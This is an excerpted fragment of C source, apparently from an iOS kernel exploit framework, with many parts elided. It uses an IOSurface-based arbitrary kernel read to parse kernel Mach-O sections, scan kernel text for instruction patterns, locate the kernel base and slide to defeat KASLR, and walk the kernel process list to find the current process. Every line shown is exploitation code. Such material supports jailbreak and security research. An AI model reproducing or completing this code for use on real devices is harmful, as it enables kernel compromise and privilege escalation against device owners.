...
{
    uint64_t magic = dynamic_uget(IOSurface, PixelFormat, object_uaddr);
...
{
    kread_from_method(uint32_t, kread_IOSurface_kread_u32);
}
...
void get_kernel_section(struct kfd* kfd, uint64_t kernel_base, const char *segment, const char *section, uint64_t *addr_out, uint64_t *size_out)
{
    ...
    kread((uint64_t)kfd, kernel_base, &kernel_header, sizeof(kernel_header));
    ...
    for(int ci = 0; ci < kernel_header.ncmds && cmdAddr <= cmdEnd; ci++)
    {
        ...
        kread((uint64_t)kfd, cmdAddr, &cmd, sizeof(cmd));
        ...
        if(cmd.cmd == LC_SEGMENT_64)
        {
            ...
            for(int si = 0; si < cmd.nsects; si++)
            {
                ...
                kread((uint64_t)kfd, sectAddr, &sect, sizeof(sect));
...
#define FAST_START 0x180000
    ...
    while (true) {
        if (instrForward < textexec_text_addr_end) {
            uint32_t instr = 0;
            kread((uint64_t)kfd, instrForward, &instr, sizeof(instr));
            if (instr == movSearch) {
        ...
        if (instrBackward > textexec_text_addr) {
            uint32_t instr = 0;
            kread((uint64_t)kfd, instrBackward, &instr, sizeof(instr));
            if (instr == movSearch) {
    ...
    for (uint32_t i = 0; i < 20; i++) {
        ...
        uint32_t instr = 0;
        kread((uint64_t)kfd, addr, &instr, sizeof(instr));
...
void kread_IOSurface_find_proc(struct kfd* kfd)
{
    ...
    for (uint64_t page = textPtr & ~PAGE_MASK; true; page -= 0x4000) {
        ...
        kread((uint64_t)kfd, page, &candidate_header, sizeof(candidate_header));
    ...
    kfd->info.kaddr.kern_slide = kernel_slide;
    
    uint64_t proc_kaddr = 0;
    kread((uint64_t)kfd, kernproc, &proc_kaddr, sizeof(proc_kaddr));
    proc_kaddr = unsign_kaddr(proc_kaddr);
    kfd->info.kaddr.kernel_proc = proc_kaddr;
    
    while (proc_kaddr != 0) {
        int32_t pid = dynamic_kget2(proc, p_pid, proc_kaddr);
        if (pid == kfd->info.env.pid) {
            kfd->info.kaddr.current_proc = proc_kaddr;
            break;
        }

        proc_kaddr = dynamic_kget2(proc, p_list_le_prev, proc_kaddr);
    }
}
